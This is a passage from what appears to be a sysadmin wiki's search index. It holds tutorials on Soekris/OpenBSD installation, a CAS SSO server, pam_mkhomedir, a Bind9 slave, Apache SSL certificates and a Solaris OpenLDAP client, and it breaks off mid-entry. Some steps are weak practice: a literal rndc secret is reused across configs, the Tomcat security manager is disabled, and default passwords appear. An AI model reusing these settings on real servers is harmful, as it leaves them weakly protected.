server.\nSoekris BIOS linkConnection via Minicom linkLaunch minicom:\n$ minicom -s Then go to:\nSerial port configuration Baud rate/Parity/Bits Set it to 19200 8N1 (key combination c+a+q) Save everything and exit to validate the configuration. Now you’re connected.\nBoot linkLet’s configure the Soekris BIOS. Use your com port to connect to it and press Ctrl+P at boot to enter the BIOS:\nPOST: 012345689bcefghips1234ajklnopqr,,,tvwxy comBIOS ver. 1.33 20070103 Copyright (C) 2000-2007 Soekris Engineering. net5501 0512 Mbyte Memory CPU Geode LX 500 Mhz Pri Mas ELITE PRO CF CARD 16GB LBA Xlt 1024-255-63 15761 Mbyte Slot Vend Dev ClassRev Cmd Stat CL LT HT Base1 Base2 Int ------------------------------------------------------------------- 0:01:2 1022 2082 10100000 0006 0220 08 00 00 A0000000 00000000 10 0:06:0 1106 3053 02000096 0117 0210 08 40 00 0000E101 A0004000 11 0:07:0 1106 3053 02000096 0117 0210 08 40 00 0000E201 A0004100 05 0:08:0 1106 3053 02000096 0117 0210 08 40 00 0000E301 A0004200 09 0:09:0 1106 3053 02000096 0117 0210 08 40 00 0000E401 A0004300 12 0:14:0 104C AC23 06040002 0107 0210 08 40 01 00000000 00000000 0:20:0 1022 2090 06010003 0009 02A0 08 40 80 00006001 00006101 0:20:2 1022 209A 01018001 0005 02A0 08 00 00 00000000 00000000 0:21:0 1022 2094 0C031002 0006 0230 08 00 80 A0005000 00000000 15 0:21:1 1022 2095 0C032002 0006 0230 08 00 00 A0006000 00000000 15 1:00:0 100B 0020 02000000 0107 0290 00 40 00 0000D001 A4000000 10 1:01:0 100B 0020 02000000 0107 0290 00 40 00 0000D101 A4001000 07 1:02:0 100B 0020 02000000 0107 0290 00 40 00 0000D201 A4002000 10 1:03:0 100B 0020 02000000 0107 0290 00 40 00 0000D301 A4003000 07 5 Seconds to automatic boot. Press Ctrl-P for entering Monitor. comBIOS Monitor. Press ? for help. Once inside, set the date and time:\ntime HH:MM:SS date YYYY/MM/DD Now for some brief explanations about the boot process. Enter the BIOS again and use the show command to see the available options:\n\u003e show ConSpeed = 19200 ConLock = Enabled ConMute = Disabled BIOSentry = Enabled PCIROMS = Enabled PXEBoot = Enabled FLASH = Primary BootDelay = 5 FastBoot = Disabled BootPartition = Disabled BootDrive = 80 81 F0 FF ShowPCI = Enabled Reset = Hard CpuSpeed = Default The BootDrive devices are indicated as follows:\n80: hard disk (IDE or SATA) 81: compact flash F0: PXE We’ll boot from PXE to launch the OpenBSD installation:\nboot F0 OpenBSD Installation linkPerform your installation as you normally would, except it would be good not to set up a swap partition to avoid stressing the Compact Flash.\nThen, toward the end of the installation, don’t forget to specify that you also want to use the com port to connect:\nChange the default console to com0? [no] yes Available speeds are: 9600 19200 38400 57600 115200. Which one should com0 use? (or 'done') [9600] 19200 Saving configuration files...done. Then reboot, and once again we’ll touch the BIOS one last time to specify the boot order:\nset BootDrive=81 80 F0 FF reboot There are subtleties described below due to the short lifespan of compact flash. We’ll do everything possible to preserve it as much as possible.\nRemove Access Information linkLet’s remove access information on the compact flash with the noatime option in fstab:\n/dev/wd0a / ffs rw,noatime 1 1 /dev/wd0d /var ffs rw,nodev,nosuid,noatime 1 2 Add MFS Filesystems linkAdd MFS filesystems to your data that changes regularly:\nMFS: Using a Filesystem in RAM\nWatchdog linkI strongly recommend enabling the watchdog:\nSetting up a Watchdog\nUpdating OpenBSD linkFor updates, simply specify during installation that you want to upgrade the system. Then, after rebooting, download the etcXX.tgz file of the OpenBSD version you’re upgrading to in /tmp and run this command:\nsysmerge -s etcXX.tgz You’ll then see menus for merging your configurations.\nFAQ linkWhy doesn’t the OS boot on first attempt? I have to do a cold boot for it to work. linkI had messages like these:\nopen(hd0a:/etc/boot.conf): Unknown error: code 102 boot\u003e booting hd0a:/bsd: open hd0a:/bsd: Unknown error: code 102 failed(102). will try /bsd boot\u003e booting hd0a:/bsd: open hd0a:/bsd: Invalid argument failed(22). will try /bsd Turning timeout off. boot\u003e Forced to reset at the Monitor (BIOS) level, and therefore do a Cold boot for the OS to boot, what a joke…\nTo solve the problem, there are 2 solutions:\nChange your Flash card to a more compatible one (SanDisk for example, as indicated on the Soekris site) References linkhttp://ludique.u-bourgogne.fr/~leclercq/wiki/index.php/Soekris\nInstalling OpenBSD on Soekris via QEMU\nhttp://www.lininfo.org/spip.php?article11\nhttp://wiki.gcu.info/doku.php?id=openbsd:install_soekris\n"
            }
        );
    index.add(
            {
                id:  506 ,
                href: "\/CAS_:_Mise_en_place_d\u0027un_serveur_SSO\/",
                title: "CAS: Setting Up an SSO Server",
                description: "Learn how to set up and configure Central Authentication Service (CAS) for Single Sign-On (SSO) across multiple applications, with specific instructions for Confluence and Jira integration.",
                content: "Introduction linkSingle sign-on (SSO) is a property of access control of multiple, related, but independent software systems. With this property a user logs in once and gains access to all systems without being prompted to log in again at each of them. Single sign-off is the reverse property whereby a single action of signing out terminates access to multiple software systems.\nAs different applications and resources support different authentication mechanisms, single sign-on has to internally translate to and store different credentials compared to what is used for initial authentication.\nPurpose linkIn order to avoid users having to sign on for each application, we want to have them authenticate on a dedicated application. Then, each time the user accesses another application, this application will ask the authentication application if the user is already authenticated and permitted to use this application.\nThe product chosen for this purpose is JAS-SIG CAS. It’s widely used in various environments, from big universities to SMEs or large companies such as Valtech, Smile or CGG Veritas.\nThe 2 main applications currently used in my company (confluence \u0026 jira) have already been “CASified” by other people and the process is well documented. For other applications, there are several client libraries developed. These libraries must be integrated and used in the various applications. The difficulty of this depends on the application’s source availability, how clear the sources are, and what knowledge admins and/or developers have of the application. Successful CASification of some applications will be described on this page.\nInstallation linkTomcat installation \u0026 configuration linkYou need a tomcat server, preferably installed on a debian system (but it can really be any kind of system).\nSo, install a basic debian server environment.\nInstall sun java 5 or 6 (it doesn’t really matter):\napt-get install sun-java6-jdk sun-java6-fonts Install tomcat (release 5.5 actually). To avoid problems, you’ll need to edit /etc/default/tomcat5.5 and uncomment the line which defines TOMCAT5_SECURITY. By default, this variable is set to “yes”. Set it to “no”.\nYou’ll also need to have SSL enabled on your tomcat. For this, follow the instructions given on these pages (just change the validity length from 365 to 3652): http://blogs.dfwikilabs.org/pigui/2007/12/10/configuring-tomcat-55-for-ssl-using-openssl/ http://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html\nYou’ll have to use the certificate on the various clients. I’ll remind you this when needed.\nJA-SIG Webapp configuration \u0026 compilation linkYou have to download and compile the cas web application (the cas server itself). For this you’ll need to use maven. For convenience and clarity, perform the following operations on a development server. You don’t have to install and compile on the production server.\nInstall maven2:\napt-get install maven2 If your system is not debian lenny, just help yourself.\nDownload the tar file from ja-sig website (http://www.jasig.org/cas/download).\nUntar the file where you want.\nChange to the directory you’ve just untared and edit the file pom.xml At the end of the dependencies element, add this:\n${project.groupId} cas-server-support-ldap ${project.version} A few lines below, comment out the line Save the file and exit your editor Then change directory to cas-server-webapp/src/main/webapp/WEB-INF and edit the file deployerConfigContext.xml Find the string “SimpleTestUsernamePassword”. Comment out this bean and add a new bean for the ldap authentication. You should have this: In the same file, go to the end and before the , add this new bean declaration: ldap://tasmania/ ldap://star1/ Save the file and exit your editor Go back to the top directory (the one you untared the initial file) and compile the whole stuff with maven: mvn -Dmaven.test.skip=true package install If the compilation succeeded, you have a cas.war file in $TOPDIR/cas-server-webapp/target.\nJA-SIG Webapp installation \u0026 tests linkCopy the war file to the webapps directory (/var/lib/tomcat5.5/webapps) of your tomcat server.\nOnce the file has been copied, eventually restart tomcat. Then, if everything is ok, you should be able to access\nhttp://ServerName:8180/cas/login and login with your regular account \u0026 password\nYou should also be able to use the ssl connection:\nhttps://ServerName:8443/cas/login\nTo reset the test, you have to remove the cookies from your browser (Options/clear my traces, uncheck everything but the stuff related to cookies).\nWell, if you successfully accessed the pages above, you can now configure your various applications to use the CAS server.\nCASification of the Applications linkNow you have a working CAS server. You’ll have to integrate CAS to your various applications. It can be done more or less simply, depending on the application and the programming language and/or environment used for these applications.\nHowever, there are some common things to take care of, especially about your cas server’s certificate. Most applications require having this certificate trusted/approved/recognized. That means you must declare this certificate in some way. Tomcat webapps \u0026 certificate.\nFor webapps applications such as jira or confluence, you need to add your cas server’s certificate to the certificate repository of the jvm used by your tomcat server.\nTo do so, first find the JVM used by tomcat. For debian based systems it may be the global jvm in /usr/lib/jvm. For jira \u0026 confluence, the jvm is embedded with the packages. If your jira is in /home/jira, the jvm used might also be under this directory.\nkeytool -import -alias cas -file YourCASServerCertificate.pem -keystore $JAVA_HOME/jre/lib/security/cacerts The default password for the jre certificate store is “changeit” …\nConfluence \u0026 Jira linkThese 2 softwares are provided by the same company and use the same technologies. So their configuration to use CAS is almost identical. You could use 2 different configurations: http://www.soulwing.org/ http://www.ja-sig.org/wiki/display/CASC/Configuring+Confluence+with+JASIG+CAS+Client+for+Java+3.1\nThe configuration used in my company is based on the last one. Actually, some modifications were needed for the Single Sign On AND the Single Sign Out to work correctly. Here are the configurations…\nConfluence linkFirst, add the CAS server’s certificate in the jvm keystore as described above.\nGo to the directory $CONFLUENCE_HOME/confluence/WEB-INF\nEdit the file classes/seraph-config.xml and modify the value of “parameter” for login.url, link.login.url, logout.url to use the cas server. Replace the authenticator class with the jasig cas. You should finally have something like this:\nlogin.url https://deb-cas:8443/cas/login?service=${originalurl} link.login.url https://deb-cas:8443/cas/login?service=http://192.168.0.234:18080/ logout.url https://deb-cas:8443/cas/logout cookie.encoding cNf login.cookie.key seraph.confluence \u003c\\!--only basic authentication available--\u003e authentication.type os_authType config.file seraph-paths.xml Next, edit the file web.xml and add the following lines after the 2 context-param tokens:\nCAS Single Sign Out Filter org.jasig.cas.client.session.SingleSignOutFilter CAS Authentication Filter org.jasig.cas.client.authentication.AuthenticationFilter casServerLoginUrl https://deb-cas:8443/cas/login validateUrl https://deb-cas:8443/cas/serviceValidate serverName http://192.168.0.234:18080 CasValidationFilter org.jasig.cas.client.validation.Cas20ProxyReceivingTicketValidationFilter casServerUrlPrefix https://deb-cas:8443/cas serverName http://192.168.0.234:18080 redirectAfterValidation true CAS HttpServletRequest Wrapper Filter org.jasig.cas.client.util.HttpServletRequestWrapperFilter CAS Single Sign Out Filter /* CAS Authentication Filter /* CasValidationFilter /* CAS HttpServletRequest Wrapper Filter /* org.jasig.cas.client.session.SingleSignOutHttpSessionListener Finally, locate and edit the file classes/xwork.xml and modify the redirect parameter in the action.logout item. If you can’t locate the file xwork.xml, just unpack it from lib/confluence-*.jar. You can unpack it with the unzip utility…\nYou should have something like this:\n/logout.vm https://deb-cas:8443/cas/logout Now, you can restart your confluence server. You should be able to login through CAS SSO.\nJira linkJust proceed as for confluence. In classes/seraph-config.xml, replace Confluence by Jira in the class name org.jasig.cas.client.integration.atlassian.ConfluenceCasAuthenticator\n"
            }
        );
    index.add(
            {
                id:  507 ,
                href: "\/PAM_:_Installer_pam_mkhomedir_pour_la_cr%C3%A9ation_automatique_des_home_utilisateurs\/",
                title: "PAM: Install pam_mkhomedir for Automatic User Home Directory Creation",
                description: "How to install and configure pam_mkhomedir on Solaris to automatically create home directories for users at login time",
                content: "Introduction linkYou may be in a situation like mine where you have your Solaris connected to an LDAP server or similar, and you’re facing the problem of automatic home directory creation for users who connect. After 2-3 hours of struggles, I finally managed to compile and configure everything.\nHere’s my documentation to save time for others who might face the same issue.\nPrerequisites linkFirst, you’ll need a small package to avoid errors like this:\nld: fatal: file values-Xa.o: open failed: No such file or directory To avoid this problem, install the SUNWarc package:\npkgadd -d . /cdrom/cdrom0/Solaris_10/Product/SUNWarc You’ll also need to install gcc:\npkg-get install gcc4core gcc4g++ Then, we’ll add these to our path:\nexport PATH=$PATH:/opt/csw/gcc4/bin export CC=gcc Compilation linkNow we can proceed with the compilation.\nwget http://www.kernel.org/pub/linux/libs/pam/pre/library/Linux-PAM-0.81.tar.bz2 ./configure cp _pam_aconf.h libpam/include/security cd modules/pammodutil gcc -c -O2 -D_REENTRANT -DPAM_DYNAMIC -Wall -fPIC -I../../libpam/include -I../../libpamc/include -Iinclude modutil_cleanup.c gcc -c -O2 -D_REENTRANT -DPAM_DYNAMIC -Wall -fPIC -I../../libpam/include -I../../libpamc/include -Iinclude modutil_ioloop.c gcc -c -O2 -D_REENTRANT -DPAM_DYNAMIC -Wall -fPIC -I../../libpam/include -I../../libpamc/include -Iinclude modutil_getpwnam.c -D_POSIX_PTHREAD_SEMANTICS cd ../pam_mkhomedir gcc -c -O2 -D_REENTRANT -DPAM_DYNAMIC -Wall -fPIC -I../../libpam/include -I../../libpamc/include -I../pammodutil/include pam_mkhomedir.c /usr/ccs/bin/ld -o pam_mkhomedir.so -B dynamic -G -lc pam_mkhomedir.o ../pammodutil/modutil_*.o Installation linkInstallation is quite simple. Still in the source directory, execute:\ncp pam_mkhomedir.so /usr/lib/security/pam_mkhomedir.so.1 cd /usr/lib/security ln -s pam_mkhomedir.so.1 pam_mkhomedir.so chown root:bin pam_mkhomedir.so.1 That’s it! :-)\nConfiguration linkFor configuration, we’ll simply edit pam.conf and add this line:\n... # Default definition for Session management # Used when service name is not explicitly mentioned for session management # other session required pam_unix_session.so.1 other session required pam_mkhomedir.so.1 skel=/etc/skel/ umask=0022 ... You can now log in and you’ll get this message on the first login of a user:\nCreating directory '/home/pmavro'. Resources linkhttp://www.webservertalk.com/message1674632.html\nhttp://osdir.com/ml/linux.pam/2006-12/msg00018.html\n"
            }
        );
    index.add(
            {
                id:  508 ,
                href: "\/Installation_et_configuration_d\u0027un_serveur_Bind9_secondaire_(Slave)\/",
                title: "Installation and Configuration of a Bind9 Secondary (Slave) Server",
                description: "Guide for setting up a secondary Bind9 DNS server including installation, configuration, and troubleshooting tips.",
                content: "Introduction linkWhen you want to set up your own DNS server, you must have a secondary server. If you don’t have other machines, you can use Gandi, otherwise follow this guide.\nDon’t forget to declare the secondary server on the primary server.\nInstallation linkOn the secondary server:\napt-get install bind9 For OpenBSD, nothing to do, it’s already installed by default.\nConfiguration linkBefore beginning, declare your secondary servers in your domain name records (update NS records + ACL in named.conf), otherwise notifications won’t work.\nConfiguration of Permissions linkIf you want a chrooted environment, proceed as follows, otherwise skip this step:\nmkdir -p /var/lib/named/etc mkdir /var/lib/named/dev mkdir -p /var/lib/named/var/cache/bind mkdir -p /var/lib/named/var/run/bind/run mv /etc/bind /var/lib/named/etc ln -s /var/lib/named/etc/bind /etc/bind mknod /var/lib/named/dev/null c 1 3 mknod /var/lib/named/dev/random c 1 8 chmod 666 /var/lib/named/dev/null /var/lib/named/dev/random chown -R bind:bind /var/lib/named/var/* chown -R bind:bind /var/lib/named/etc/bind Then edit the /etc/default/bind9 file to tell it to chroot at service startup:\nOPTIONS=\"-u bind -t /var/lib/named\" ... host.conf linkHere’s how to configure the /etc/host.conf file:\norder hosts,bind multi on We are saying here to first look in the hosts file and then in Bind when queries are made from the server.\nnamed.conf linkThis file must contain the same information for RNDC and external zone (to replicate):\ninclude \"/etc/bind/named.conf.options\"; // be authoritative for the localhost forward and reverse zones, and for // broadcast zones as per RFC 1912 // TSIG Security | RNDC Key key \"rndc-key\" { algorithm hmac-md5; secret \"a4fGtm0fB4zO+4KfqH/zNZ3nPq+ThM5yUCEE7AqzEVI=\"; }; controls { inet 127.0.0.1 port 953 allow { 127.0.0.1; } keys { \"rndc-key\"; }; }; zone \"127.in-addr.arpa\" { type master; notify no; file \"/etc/bind/db.127\"; }; // Starting secondary transfert zones view \"externe\" { match-clients { any; }; // Recursion not permited for World Wide Web recursion no; zone \"deimos.fr\" { type slave; file \"/etc/bind/db.deimos.fr\"; notify yes; masters { 88.162.130.192; }; }; zone \"mavro.fr\" { type slave; file \"/etc/bind/db.mavro.fr\"; notify yes; masters { 88.162.130.192; }; }; zone \"0.168.192.in-addr.arpa\" { type slave; file \"/etc/bind/db.0.168.192.inv.local\"; notify yes; masters { 88.162.130.192; }; }; }; named.conf.options linkSame file as for the primary server:\noptions { directory \"/var/cache/bind\"; pid-file \"/var/run/bind/run/named.pid\"; // If there is a firewall between you and nameservers you want // to talk to, you might need to uncomment the query-source // directive below. Previous versions of BIND always asked // questions using port 53, but BIND 8.1 and later use an unprivileged // port by default. query-source address * port 53; // If your ISP provided one or more IP addresses for stable // nameservers, you probably want to use them as forwarders. // Uncomment the following block, and insert the addresses replacing // the all-0's placeholder. // forwarders { // 0.0.0.0; // }; // For dial up connections dialup yes; allow-query { any; }; // Security version version \"Microsoft 2000 DNS Server\"; auth-nxdomain no; # conform to RFC1035 }; rndc.conf linkWe’re using exactly the same file again as for the primary server:\nkey \"rndc-key\" { algorithm hmac-md5; secret \"a4fGtm0fB4zO+4KfqH/zNZ3nPq+ThM5yUCEE7AqzEVI=\"; }; options { default-key \"rndc-key\"; default-server 127.0.0.1; default-port 953; }; Don’t forget to copy the rndc.key file from the primary server to the /etc/bind directory and assign it the correct permissions.\nVerification linkAll that’s left is to restart the bind server and the domain name configuration files will automatically appear in /etc/bind:\n/etc/init.d/bind9 restart FAQ linkNo files appear and the logs say there are no permissions linkThe solution is simple:\nchown -Rf root:bind /etc/bind Why do I have this message in my logs: refused notify from non-master linkHere’s the type of message you might encounter when you’re not lucky:\nOct 2 16:43:50 tasmania named[7978]: zone deimos.local/IN/internalview: refused notify from non-master: 192.168.0.27#37097 This is due to a Bind update (9.3). You simply need to authorize the server to notify itself in your named.conf by adding allow-notify:\n... zone \"deimos.local\" { type slave; file \"/etc/bind/db.deimos.local\"; notify yes; masters { 192.168.0.69; }; allow-notify { 192.168.0.27; }; }; ... refresh: failure trying master 53 (source 0.0.0.0#0): operation canceled linkThis is certainly due to a firewalling problem, make sure your port 53 is open for both TCP and UDP on both sides.\ncould not open entropy source /dev/random: file not found linkIf you encounter this problem, you are probably working in a vserver. To work around the issue, add a bcapabilities:\necho CAP_MKNOD \u003e\u003e /etc/vservers/ed/bcapabilities This will avoid problems like these in the logs:\n24530 Oct 4 21:12:27 ed named[8642]: could not open entropy source /dev/random: file not found 24531 Oct 4 21:12:27 ed named[8642]: using pre-chroot entropy source /dev/random Resources linkhttp://fr.wikibooks.org/wiki/Linux_VServer\n"
            }
        );
    index.add(
            {
                id:  509 ,
                href: "\/Mise_en_place_de_certificats_SSL_sous_Apache_2\/",
                title: "Setting up SSL certificates with Apache 2",
                description: "A guide on how to create, configure and implement SSL certificates with Apache 2 on Debian and OpenBSD systems",
                content: "Introduction linkSSL certificates are not always easy to understand and implement. Nevertheless, I will try to make it clear. For those who wish to be signed by a free certification authority, I invite you to visit the CACert website.\nInstallation linkDebian linkOnce again, it’s quite simple here:\napt-get install openssl Then you’ll download a small program that will make your life easier:\ncd ~/ mkdir ssl Here is the file to download and put in your ssl folder.\nOnce done, decompress it:\ntar -xzvf cert_manager.tar.gz OpenBSD linkFor OpenBSD, nothing special to install. Apache is provided as standard with the SSL module.\nConfiguration linkDebian linkLet’s go to the decompressed folder:\ncd CERT_MANAGER If you want to change the number of days for the validity of your certificate, edit the ca_openssl.cnf file and modify line 39:\ndefault_days = 365 Change 365 to what you want (3650 for 10 years for example).\nCreating a certification authority linkWe will now create the certification authority for our local network. First, we initialize our certificate management environment:\n./cert_manager.sh --init This command creates the necessary folders and files for the proper functioning of our script and asks you the necessary questions for the configuration of your certification authority:\nYou will now be asked to give informations for your certificate authority. Description du domaine [défaut : Domaine local]: Deimos Code de votre pays [défaut : FR]: Nom de votre région [défaut : Ile de France]: Nom de votre ville [défaut : Paris]: Nom de votre domaine [défaut : domain.local]: www.deimos.fr Email de l'administrateur [défaut : root@domain.local]: root@deimos.fr We then create our certification authority:\n./cert_manager.sh --create-ca You now have what you need to sign your own certificates.\nCreating a server certificate for our local network linkNow that you have a certification authority, we will create a certification request in order to obtain a certificate signed by our authority. For example, to create a certificate for our HTTPS server:\n./cert_manager.sh --generate-csr=https Note: https is used to generate the filename of the request. It is preferable that this value does not contain spaces or special characters.\nYou must then enter your certificate information:\nYou will now be asked to give informations for your certificate authority. Type de serveur [défault : HTTP server]: HTTPS server Code de votre pays [défaut : FR]: Nom de votre région [défaut : Ile de France]: Nom de votre ville [défaut : Paris]: Email de l'administrateur [défaut : root@deimos.fr]: Nom de votre domaine [défaut : domain.local]: www.deimos.fr Noms de domaines supplémentaires, un par ligne. Finissez par une ligne vide. SubjectAltName: DNS:doc.deimos.fr SubjectAltName: DNS:imp.deimos.fr SubjectAltName: DNS:mail.deimos.fr SubjectAltName: DNS: Note: As you can see, this tool gives you the possibility to generate certificates valid for several domain names.\nAt the end of the procedure, the tool displays the created request because you can, if you wish, have this request signed by the CACert site.\nIf the certificate is intended for your local network, you can use your certification authority to sign it:\n./cert_manager.sh --sign-csr=https This command displays the information included in the certificate request and asks you if you agree to sign it:\nSign the certificate? [y/n]:y 1 out of 1 certificate requests certified, commit? [y/n]y You now have 2 files that together form your certificate:\n./CERTIFICATES/https_cert.pem ./PRIVATE_KEYS/https_key.pem All you have to do now is copy these files and the public key of your certification authority to the appropriate place for your server configuration:\n./CERTIFICATE_AUTHORITY/ca-cert.pem Integration with Apache linkFor the Apache part, it’s quite simple, just copy certain files:\nmkdir -p /etc/apache2/ssl/ cp CERTIFICATE_AUTHORITY/ca-cert.pem /etc/apache2/ssl/deimos.fr.ca.crt cp CERTIFICATES/https_cert.cert /etc/apache2/ssl/deimos.fr.crt cp PRIVATE_KEYS/https_key.pem /etc/apache2/ssl/deimos.fr.key Then put this in a VirtualHost in Apache (make a special SSL VirtualHost):\nServerAdmin xxx@mycompany.com ServerName fire.deimos.fr SSLEngine on SSLCACertificateFile /etc/apache2/ssl/deimos.fr.ca.crt SSLCertificateFile /etc/apache2/ssl/deimos.fr.crt SSLCertificateKeyFile /etc/apache2/ssl/deimos.fr.key DocumentRoot /var/www/ Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all OpenBSD linkTo generate certificates, here’s how to proceed:\ncd /etc/ssl openssl genrsa -out /etc/ssl/private/server.key 2048 openssl req -new -key /etc/ssl/private/server.key -out /etc/ssl/private/server.csr openssl x509 -req -days 3650 -in /etc/ssl/private/server.csr -signkey /etc/ssl/private/server.key -out /etc/ssl/server.crt Apache Configuration linkDebian linkTo finish, add this to /etc/apache2/ports.conf:\nListen 443 All that remains is to enable the ssl mod for the configuration:\na2enmod ssl We can now admire the result by restarting Apache2 :-)\n/etc/init.d/apache2 restart OpenBSD linkMulti-VirtualHost SSL linkLike everyone else, one day you tried to have VHosts in SSL, and the Apache people informed you that you can’t. The problem is that you can only have one certificate because information like the Host is inside the request, and is not accessible to the layer that decides which certificate to use and handles the encryption.\nThere were some ugly tricks to avoid the warning in the browser, like putting a certificate for *.mydomainofdeath.biz but it’s dead if you have several domains on the server.\nSo here’s the solution that explains that even if the OpenSSL lib doesn’t support the TLS extension that you need (SNI), on the GNU side it has been supported for 2 years. Here’s the long-awaited documentation:\nDocumentation on the implementation of multi-SSL with mod_gnutls Documentation on enabling multiple HTTPS Sites For one IP using TLS extensions References link SSL and Certificates Documentation https://www.traduc.org/docs/HOWTO/lecture/SSL-Certificates-HOWTO.html Documentation for OpenBSD "
            }
        );
    index.add(
            {
                id:  510 ,
                href: "\/Mise_en_place_du_client_OpenLDAP\/",
                title: "Setting up OpenLDAP Client",
                description: "Step-by-step guide for configuring an OpenLDAP client on Solaris systems.",
                content: "Introduction linkOpenLDAP is unfortunately not available as standard on Solaris, however it is possible to install it via pkg-get.\nConfiguration link Configure the /etc/pam.conf file: For each line:\nservice auth required pam_unix_auth.so.1 replace “required” with “sufficient” and add behind the line:\nservice auth sufficient pam_ldap.so.1 try_first_pass This should result in something like this (/etc/pam.conf):\n# #ident \"@(#)pam.conf 1.28 04/04/21 SMI\" # # Copyright 2004 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # PAM configuration # # Unless explicitly defined, all services use the modules # defined in the \"other\" section. # # Modules are defined with relative pathnames, i.e., they are # relative to /usr/lib/security/$ISA. Absolute path names, as # present in this file in previous releases are still acceptable. # # Authentication management # # login service (explicit because of pam_dial_auth) # login auth requisite pam_authtok_get.so.1 login auth required pam_dhkeys.so.1 login auth required pam_unix_cred.so.1 login auth sufficient pam_ldap.so.1 try_first_pass login auth sufficient pam_unix_auth.so.1 login auth required pam_dial_auth.so.1 # # rlogin service (explicit because of pam_rhost_auth) # rlogin auth sufficient pam_rhosts_auth.so.1 rlogin auth requisite pam_authtok_get.so.1 rlogin auth required pam_dhkeys.so.1 rlogin auth required pam_unix_cred.so.1 rlogin auth sufficient pam_ldap.so.1 try_first_pass rlogin auth sufficient pam_unix_auth.so.1 # # Kerberized rlogin service # krlogin auth required pam_unix_cred.so.1 krlogin auth binding pam_krb5.so.1 krlogin auth sufficient pam_ldap.so.1 krlogin auth sufficient pam_unix_auth.so.1 # # rsh service (explicit because of pam_rhost_auth, # and pam_unix_auth for meaningful pam_setcred) # rsh auth sufficient pam_rhosts_auth.so.1 rsh auth required pam_unix_cred.so.1 # # Kerberized rsh service # krsh auth required pam_unix_cred.so.1 krsh auth binding pam_krb5.so.1 krsh auth sufficient pam_ldap.so.1 krsh auth sufficient pam_unix_auth.so.1 # # Kerberized telnet service # ktelnet auth required pam_unix_cred.so.1 ktelnet auth binding pam_krb5.so.1 ktelnet auth sufficient pam_ldap.so.1 ktelnet auth sufficient pam_unix_auth.so.1 # # PPP service (explicit because of pam_dial_auth) # ppp auth requisite pam_authtok_get.so.1 ppp auth required pam_dhkeys.so.1 ppp auth required pam_unix_cred.so.1 ppp auth sufficient pam_ldap.so.1 ppp auth sufficient pam_unix_auth.so.1 ppp auth required pam_dial_auth.so.1 # # Default definitions for Authentication management # Used when service name is not explicitly mentioned for authentication # other auth requisite pam_authtok_get.so.1 other auth required pam_dhkeys.so.1 other auth required pam_unix_cred.so.1 other auth sufficient pam_ldap.so.1 other auth sufficient pam_unix_auth.so.1 # # passwd command (explicit because of a different authentication module) # passwd auth required pam_passwd_auth.so.1 # # cron service (explicit because of non-usage of pam_roles.so.1) # cron account required pam_unix_account.so.1 # # Default definition for Account management # Used when service name is not explicitly mentioned for account management # other account requisite pam_roles.so.1 other account required pam_unix_account.so.1 # # Default definition for Session management # Used when service name is not explicitly mentioned for session management # other session required pam_unix_session.so.1 # # Default definition for Password management # Used when service name is not explicitly mentioned for password management # other password required pam_dhkeys.so.1 other password requisite pam_authtok_get.so.1 other password requisite pam_authtok_check.so.1 other password required pam_authtok_store.so.1 # # Support for Kerberos V5 authentication and example configurations can # be found in the pam_krb5(5) man page under the \"EXAMPLES\" section. # Configure the /etc/nsswitch.ldap file Keep “ldap” only where it’s useful: for now on the passwd: and group: lines. For the rest, use the content of the /etc/nsswitch.dns file. This gives:\n# # Copyright 2006 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # # /etc/nsswitch.dns: # # An example file that could be copied over to /etc/nsswitch.conf; it uses # DNS for hosts lookups, otherwise it does not use any other naming service. # # \"hosts:\" and \"services:\" in this file are used only if the # /etc/netconfig file has a \"-\" for nametoaddr_libs of \"inet\" transports. # DNS service expects that an instance of svc:/network/dns/client be # enabled and online. passwd: files ldap group: files ldap # You must also set up the /etc/resolv.conf file for DNS name # server lookup. See resolv.conf(4). hosts: files dns # Note that IPv4 addresses are searched for in all of the ipnodes databases # before searching the hosts databases. ipnodes: files dns networks: files protocols: files rpc: files ethers: files netmasks: files bootparams: files publickey: files # At present there isn't a 'files' backend for netgroup; the system will # figure it out pretty quickly, and won't use netgroups at all. netgroup: files automount: files aliases: files services: files printers: user files auth_attr: files prof_attr: files project: files tnrhtp: files tnrhdb: files Once that is done, we can proceed with the configuration. Note: if you are in a cluster environment, adapt to your initial configuration:\ncp /etc/nsswitch.ldap /etc/nsswitch.conf Launch the LDAP client configuration Simply type the command:\nldapclient manual -v -a authenticationMethod=simple -a proxyDN=cn=admin,dc=openldap,dc=mydomain,dc=local -aproxyPassword=bidon -a defaultSearchBase=dc=openldap,dc=mydomain,dc=local -a defaultServerList=ldap.mydomain.local -a serviceSearchDescriptor=passwd:dc=openldap,dc=mydomain,dc=local?sub -a serviceSearchDescriptor=shadow:dc=openldap,dc=mydomain,dc=local?sub -a serviceSearchDescriptor=group:dc=openldap,dc=mydomain,dc=local?sub -a serviceAuthenticationMethod=pam_ldap:simple= Note: it seems that the ldapclient command is bugged and requires the proxyDN and proxyPassword parameters even if they are unused (and even if they contain anything)!\nBe careful with the home directory, you need to configure /etc/auto_home (http://www.solaris-fr.org/home/docs/base/utilisateurs). For me, this gives: # # Copyright 2003 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # ident \"@(#)auto_home 1.6 03/04/28 SMI\" # # Home directory map for automounter # +auto_home * localhost:/export/home/\u0026 In case you want to automatically create the home directory, you need to port the pam_mkhomedir module from Linux:\nhttp://mega.ist.utl.pt/~filipe/pam_mkhomedir-sol/?C=D;O=A http://www.keutel.de/pam_mkhomedir/index.html A good idea would also be to automatically mount the home directory from an NFS server.\nUser accounts in the LDAP directory need to have the “shadowAccount” objectClass in their objectClass list to be recognized by Solaris.\nFAQ linkWARNING: /var/ldap/ldap_client_file is missing or not readable linkI got this message when I tried to initialize the service with the ldapclient command and the LDAP servers were down. Check that:\nThe client service (svc:/network/ldap/client:default) is offline The LDAP servers are available If it still doesn’t work, you’ll need to create 2 files manually:\n# # Do not edit this file manually; your changes will be lost.Please use ldapclient (1M) instead. # NS_LDAP_FILE_VERSION= 2.0 NS_LDAP_SERVERS= server2, server1 NS_LDAP_SEARCH_BASEDN= dc=openldap,dc=mycompany,dc=com NS_LDAP_AUTH= simple NS_LDAP_CACHETTL= 0 NS_LDAP_SERVICE_SEARCH_DESC= passwd:dc=openldap,dc=mycompany,dc=com?sub?\u0026(\u0026(objectClass=posixAccount)(!(objectClass=computer))) NS_LDAP_SERVICE_SEARCH_DESC= 